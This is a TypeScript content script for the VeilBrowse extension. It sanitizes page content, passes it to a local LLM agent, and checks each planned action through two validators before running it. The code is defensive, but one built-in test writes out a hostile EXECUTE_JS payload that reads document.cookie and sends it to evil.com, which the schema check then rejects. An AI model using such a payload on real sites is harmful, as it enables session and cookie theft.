import { PageScanner } from './scanner';
import { applyOverlay } from './overlay';
import { runPrivacyFirewall } from './firewall';
import { LocalMockAgent } from './mock-agent';
import { OllamaReasoningProvider } from './ollama-provider';
import { validateActionSchema, validateAction, executeAction } from './action-validator';
import {
  SensitiveElementType,
  generateRequestId,
  generateSessionId,
  type DomScanResultMessage,
  type DomScanResult,
  type OutboundAgentRequest,
  type AgentAction,
  type UnifiedSanitizedContext,
} from '@veilbrowse/shared-types';

/**
 * VeilBrowse Content Script — Interactive Agent & Privacy Firewall Entry Point
 *
 * Responsibilities:
 * 1. Maintain continuous PageScanner (open shadow DOM, rAF batching, loop-prevention).
 * 2. Enforce local privacy firewall (prepareSanitizedContext, visual masking, opaque IDs).
 * 3. Provide secure message bridge between demo page UI and extension:
 *    - RUN_AGENT_TASK -> local firewall -> Qwen/Ollama -> 2-tier validator -> execute safe action
 *    - TEST_SENSITIVE_ATTACK -> 2-tier validator -> BLOCKED (fail-closed)
 *    - TEST_EXECUTE_JS_ATTACK -> 1-tier validator -> REJECTED (schema guard)
 *    - TEST_UNKNOWN_TARGET -> 2-tier validator -> BLOCKED (fail-closed)
 *    - GET_FIREWALL_STATUS -> live sanitized statistics
 *
 * PRIVACY INVARIANT:
 * - Scanned elements never contain field values or passwords.
 * - Outbound boundary contains only UnifiedSanitizedContext with opaque IDs.
 * - Browser is the security boundary: no action executes without local validation.
 */

console.log('[VeilBrowse] Content script active with dynamic PageScanner & Privacy Firewall.');

let latestScanResult: DomScanResult | null = null;
let latestScannerInstance: PageScanner | null = null;

function delay(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function postToPage(data: Record<string, unknown>): void {
  window.postMessage(
    {
      source: 'VEILBROWSE_EXTENSION',
      ...data,
    },
    '*'
  );

  // The extension side panel is the primary agent UI.
  // Broadcast only structured status/results; never raw DOM values or secrets.
  chrome.runtime.sendMessage(data).catch(() => {
    // Side panel may be closed; this is non-fatal.
  });
}

function handleScanUpdate(result: DomScanResult): void {
  try {
    latestScanResult = result;
    applyOverlay(result.elements);

    // Notify background service worker
    const message: DomScanResultMessage = {
      type: 'DOM_SCAN_RESULT',
      payload: result,
    };
    chrome.runtime.sendMessage(message, (_response: unknown) => {
      if (chrome.runtime.lastError) {
        // Non-fatal: background worker might be idle
      }
    });

    // Notify page that fresh scan is available
    postToPage({
      type: 'FIREWALL_UPDATE',
      summary: {
        total: result.summary.total,
        sensitive: result.summary.sensitive,
        byType: result.summary.byType,
      },
    });
  } catch (err: unknown) {
    console.error('[VeilBrowse] Error in scan update handler:', err);
  }
}

// Start live scanner
try {
  latestScannerInstance = new PageScanner(handleScanUpdate);
  latestScannerInstance.start();
} catch (err: unknown) {
  console.error('[VeilBrowse] Scanner startup error — fail closed:', err);
}

// Broadcast extension readiness
postToPage({
  type: 'EXTENSION_INITIALIZED',
  providerId: 'ollama-qwen2.5:3b',
});

function getDomElementByVeilId(id: string): HTMLElement | null {
  return document.querySelector(`[data-veil-id="${id}"]`) as HTMLElement | null;
}

/**
 * Executes the full agent pipeline requested by the user:
 * 1. Read task
 * 2. Local privacy firewall inspects & sanitizes DOM
 * 3. Outbound UnifiedSanitizedContext prepared
 * 4. Qwen 2.5 via Ollama (ReasoningProvider) plans actions
 * 5. Tier 1 schema validation
 * 6. Tier 2 contextual validation
 * 7. Browser execution only if approved
 * 8. Status and result updates
 */
async function runAgentPipeline(task: string, providerChoice: string = 'qwen'): Promise<void> {
  try {
    // 1. ANALYZING PAGE
    postToPage({
      type: 'AGENT_STATUS_UPDATE',
      status: 'ANALYZING PAGE',
      currentStep: 'DOM scanner inspecting interactive elements & accessibility roles...',
    });
    await delay(300);

    const domScan = latestScannerInstance?.buildScanResult() || latestScanResult;
    if (!domScan) {
      throw new Error('DOM scan result unavailable');
    }

    // 2. SANITIZING CONTEXT
    postToPage({
      type: 'AGENT_STATUS_UPDATE',
      status: 'SANITIZING CONTEXT',
      currentStep: 'Local privacy firewall stripping values and anonymizing sensitive IDs...',
    });
    await delay(300);

    const sanitizedContext: UnifiedSanitizedContext = runPrivacyFirewall(domScan, null);

    // 3. REASONING (Pluggable ReasoningProvider: LocalMockAgent or Ollama Qwen 2.5)
    const isQwen = providerChoice === 'qwen';
    const agent = isQwen ? new OllamaReasoningProvider() : new LocalMockAgent();

    postToPage({
      type: 'AGENT_STATUS_UPDATE',
      status: 'REASONING',
      currentStep: isQwen
        ? 'Ollama Qwen 2.5 3B local LLM reasoning on sanitized context (zero raw secrets)...'
        : 'LocalMockAgent planning actions on sanitized context (zero raw secrets)...',
    });
    await delay(350);

    const plannedActions = isQwen
      ? await (agent as OllamaReasoningProvider).planActions(task, sanitizedContext)
      : (agent as LocalMockAgent).planActions(task, sanitizedContext);

    const outboundRequest: OutboundAgentRequest = {
      requestId: generateRequestId(),
      sessionId: generateSessionId(),
      task,
      context: sanitizedContext,
    };

    const auditLogs: Array<{
      step: number;
      action: string;
      targetId: string;
      tier1: string;
      tier2: string;
      reasons: string[];
    }> = [];
    const executionResults: Array<unknown> = [];
    let stepIndex = 1;

    for (const action of plannedActions) {
      if (action.action === 'WAIT') {
        postToPage({
          type: 'AGENT_STATUS_UPDATE',
          status: 'EXECUTING',
          currentStep: `Waiting for UI response (${action.durationMs}ms)...`,
        });
        await delay(action.durationMs);
        continue;
      }

      const targetId = 'targetId' in action ? (action.targetId as string) : 'N/A';

      // 4. VALIDATING ACTION
      postToPage({
        type: 'AGENT_STATUS_UPDATE',
        status: 'VALIDATING ACTION',
        currentStep: `Validating Action ${stepIndex}/${plannedActions.length} (${action.action} on ${targetId})...`,
      });
      await delay(250);

      // Tier 1 Validation
      const schemaValidation = validateActionSchema(action);
      if (!schemaValidation.valid) {
        postToPage({
          type: 'AGENT_STATUS_UPDATE',
          status: 'BLOCKED',
          currentStep: `Tier 1 Schema Failure: ${schemaValidation.errors.join('; ')}`,
        });
        return;
      }

      // Tier 2 Validation
      const policyValidation = validateAction(action, sanitizedContext);

      auditLogs.push({
        step: stepIndex,
        action: action.action,
        targetId,
        tier1: 'APPROVED',
        tier2: policyValidation.decision,
        reasons: policyValidation.reasons,
      });

      if (policyValidation.decision !== 'APPROVED') {
        postToPage({
          type: 'AGENT_STATUS_UPDATE',
          status: 'BLOCKED',
          currentStep: `Action blocked by Tier 2 policy: ${policyValidation.reasons.join('; ')}`,
        });
        return;
      }

      // 5. EXECUTING
      postToPage({
        type: 'AGENT_STATUS_UPDATE',
        status: 'EXECUTING',
        currentStep: `Executing ${action.action} on ${targetId} in live browser...`,
      });
      await delay(350);

      const execResult = await executeAction(action, sanitizedContext, getDomElementByVeilId);
      executionResults.push(execResult);

      postToPage({
        type: 'AGENT_STEP_COMPLETED',
        step: stepIndex,
        providerId: agent.providerId,
        action,
        policyValidation,
        executionResult: execResult,
      });

      await delay(300);
      stepIndex++;
    }

    // 6. COMPLETED
    postToPage({
      type: 'AGENT_TASK_COMPLETED',
      payload: {
        task,
        status: 'COMPLETED',
        providerId: agent.providerId,
        sanitizedContext,
        outboundRequest,
        plannedActions,
        executionResults,
        auditLogs,
        summary: {
          totalElements: sanitizedContext.summary.totalElements,
          sensitiveElements: sanitizedContext.summary.totalSensitiveRegions,
          redactedCount: sanitizedContext.summary.redactedCount,
          allowedControls: sanitizedContext.summary.allowedControls,
          outboundPii: 0,
        },
        finalResult: 'Email notifications enabled successfully. Webpage state updated.',
      },
    });
  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : 'Unknown error';
    postToPage({
      type: 'AGENT_STATUS_UPDATE',
      status: 'ERROR',
      currentStep: `Agent pipeline error: ${msg}`,
    });
  }
}

async function runSensitiveAttackTest(): Promise<void> {
  postToPage({
    type: 'AGENT_STATUS_UPDATE',
    status: 'VALIDATING ACTION',
    currentStep: 'Evaluating hostile action targeting sensitive password field...',
  });
  await delay(250);

  const domScan = latestScannerInstance?.buildScanResult() || latestScanResult;
  if (!domScan) return;
  const sanitizedContext = runPrivacyFirewall(domScan, null);

  const pwdElement = sanitizedContext.elements.find(
    (e) => e.category === SensitiveElementType.PASSWORD
  );
  const targetId = pwdElement ? pwdElement.elementId : 'vb-pwd-target';

  const action: AgentAction = { action: 'CLICK', targetId };

  // Tier 1
  const schemaVal = validateActionSchema(action);
  // Tier 2
  const policyVal = validateAction(action, sanitizedContext);

  postToPage({
    type: 'SECURITY_TEST_RESULT',
    testType: 'SENSITIVE_TARGET',
    action,
    tier1: schemaVal.valid ? 'APPROVED' : 'REJECTED',
    tier2: policyVal.decision, // 'BLOCKED'
    reasons: policyVal.reasons,
    targetCategory: 'PASSWORD',
    targetId,
  });

  postToPage({
    type: 'AGENT_STATUS_UPDATE',
    status: 'BLOCKED',
    currentStep: `Action BLOCKED: Target '${targetId}' is classified as PASSWORD. Refusing browser execution.`,
  });
}

async function runExecuteJsAttackTest(): Promise<void> {
  postToPage({
    type: 'AGENT_STATUS_UPDATE',
    status: 'VALIDATING ACTION',
    currentStep: 'Evaluating malicious EXECUTE_JS code-injection payload at schema boundary...',
  });
  await delay(250);

  const maliciousAction = {
    action: 'EXECUTE_JS',
    code: 'alert(document.cookie); sendToRemote("http://evil.com");',
  };

  const schemaVal = validateActionSchema(maliciousAction);

  postToPage({
    type: 'SECURITY_TEST_RESULT',
    testType: 'EXECUTE_JS',
    action: maliciousAction,
    tier1: schemaVal.valid ? 'APPROVED' : 'REJECTED',
    tier2: 'N/A (Rejected at Tier 1)',
    reasons: schemaVal.errors,
  });

  postToPage({
    type: 'AGENT_STATUS_UPDATE',
    status: 'BLOCKED',
    currentStep: 'Action REJECTED at Tier 1: Action "EXECUTE_JS" is forbidden. Closed action schema enforced.',
  });
}

async function runUnknownTargetTest(): Promise<void> {
  postToPage({
    type: 'AGENT_STATUS_UPDATE',
    status: 'VALIDATING ACTION',
    currentStep: 'Evaluating action targeting borderline / ambiguous field...',
  });
  await delay(250);

  const domScan = latestScannerInstance?.buildScanResult() || latestScanResult;
  if (!domScan) return;
  const sanitizedContext = runPrivacyFirewall(domScan, null);

  const unknownEl = sanitizedContext.elements.find(
    (e) => e.category === SensitiveElementType.UNKNOWN
  );
  const targetId = unknownEl ? unknownEl.elementId : 'vb-ambiguous-target';

  const action: AgentAction = { action: 'CLICK', targetId };

  const schemaVal = validateActionSchema(action);
  const policyVal = validateAction(action, sanitizedContext);

  postToPage({
    type: 'SECURITY_TEST_RESULT',
    testType: 'UNKNOWN_TARGET',
    action,
    tier1: schemaVal.valid ? 'APPROVED' : 'REJECTED',
    tier2: policyVal.decision, // 'BLOCKED'
    reasons: policyVal.reasons,
    targetCategory: 'UNKNOWN',
    targetId,
  });

  postToPage({
    type: 'AGENT_STATUS_UPDATE',
    status: 'BLOCKED',
    currentStep: `Action BLOCKED fail-closed: Target '${targetId}' sensitivity is UNKNOWN.`,
  });
}

// Extension side-panel bridge: agent execution stays inside the content script,
 // while the side panel provides the user-facing controls.
chrome.runtime.onMessage.addListener(
  (
    message: { type?: string; payload?: { task?: string; provider?: string } },
    _sender: chrome.runtime.MessageSender,
    sendResponse: (response: unknown) => void
  ) => {
  if (message.type !== 'RUN_AGENT_TASK_FROM_PANEL') return;

  sendResponse({ ok: true });

  const task =
    typeof message.payload?.task === 'string' && message.payload.task.trim().length > 0
      ? message.payload.task.trim()
      : 'Enable email notifications';

  const providerChoice =
    message.payload?.provider === 'qwen' ? 'qwen' : 'qwen';

  void runAgentPipeline(task, providerChoice);
});

// Window Message Listener for Page <-> Extension Bridge
window.addEventListener('message', async (event: MessageEvent) => {
  if (event.source !== window || !event.data || event.data.source !== 'VEILBROWSE_PAGE') {
    return;
  }

  const { type, payload } = event.data;

  if (type === 'PING') {
    postToPage({
      type: 'PONG',
      ready: true,
      providerId: 'ollama-qwen2.5:3b',
    });
    return;
  }

  if (type === 'GET_FIREWALL_STATUS') {
    const domScan = latestScannerInstance?.buildScanResult() || latestScanResult;
    if (!domScan) {
      postToPage({
        type: 'FIREWALL_STATUS_RESULT',
        error: 'Scan not ready',
      });
      return;
    }
    const sanitizedContext = runPrivacyFirewall(domScan, null);
    postToPage({
      type: 'FIREWALL_STATUS_RESULT',
      payload: {
        totalElements: sanitizedContext.summary.totalElements,
        sensitiveElements: sanitizedContext.summary.totalSensitiveRegions,
        redactedCount: sanitizedContext.summary.redactedCount,
        allowedControls: sanitizedContext.summary.allowedControls,
        outboundPii: 0,
        sanitizedContext,
      },
    });
    return;
  }

  if (type === 'RUN_AGENT_TASK') {
    const task =
      typeof payload?.task === 'string' && payload.task.trim().length > 0
        ? payload.task.trim()
        : 'Open notification settings and enable email notifications';
    const providerChoice = typeof payload?.provider === 'string' ? payload.provider : 'mock';
    await runAgentPipeline(task, providerChoice);
    return;
  }

  if (type === 'TEST_SENSITIVE_ATTACK') {
    await runSensitiveAttackTest();
    return;
  }

  if (type === 'TEST_EXECUTE_JS_ATTACK') {
    await runExecuteJsAttackTest();
    return;
  }

  if (type === 'TEST_UNKNOWN_TARGET') {
    await runUnknownTargetTest();
    return;
  }
});
